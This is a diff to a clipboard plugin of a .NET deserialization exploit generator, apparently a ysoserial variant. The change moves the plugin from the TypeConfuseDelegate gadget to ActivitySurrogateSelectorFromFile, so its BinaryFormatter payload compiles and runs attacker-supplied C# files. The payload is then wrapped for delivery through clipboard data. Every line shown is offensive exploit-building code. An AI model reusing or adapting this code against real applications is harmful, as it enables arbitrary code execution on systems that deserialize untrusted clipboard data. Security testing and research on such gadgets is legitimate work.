@@ -1,7 +1,7 @@
 ﻿using System.Collections.Generic;
 using NDesk.Options;
 using System;
-using ysoserial.Generators;
+using ysoserial_frmv2.Generators;
 using System.IO;
 using System.Runtime.Serialization;
 using System.Runtime.Serialization.Formatters.Binary;
@@ -20,7 +20,7 @@ using System.Threading;
  *  This PoC produces an error and may crash the application
  **/
 
-namespace ysoserial.Plugins
+namespace ysoserial_frmv2.Plugins
 {
     class ClipboardPlugin : Plugin
     {
@@ -31,7 +31,7 @@ namespace ysoserial.Plugins
         static OptionSet options = new OptionSet()
             {
                 {"F|format=", "the object format: Csv, DeviceIndependentBitmap, DataInterchangeFormat, PenData, RiffAudio, WindowsForms10PersistentObject, System.String, SymbolicLink, TaggedImageFileFormat, WaveAudio. Default: System.String", v => format = v },
-                {"c|command=", "the command to be executed", v => command = v },
+                {"c|command=", "the command to be executed using ActivitySurrogateSelectorFromFileGenerator e.g. \"ExploitClass.cs; System.Windows.Forms.dll\"", v => command = v },
                 {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
             };
 
@@ -71,7 +71,7 @@ namespace ysoserial.Plugins
                 }
 
                 object payload = "";
-                if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
+                if (String.IsNullOrEmpty(command) || String.IsNullOrEmpty(command.Trim()))
                 {
                     Console.Write("ysoserial: ");
                     Console.WriteLine("Incorrect plugin mode/arguments combination");
@@ -79,7 +79,7 @@ namespace ysoserial.Plugins
                     System.Environment.Exit(-1);
                 }
 
-                byte[] serializedData = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false);
+                byte[] serializedData = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "BinaryFormatter", false);
                 MemoryStream ms = new MemoryStream(serializedData);
                 DataSetMarshal payloadDataSetMarshal = new DataSetMarshal(ms);
 
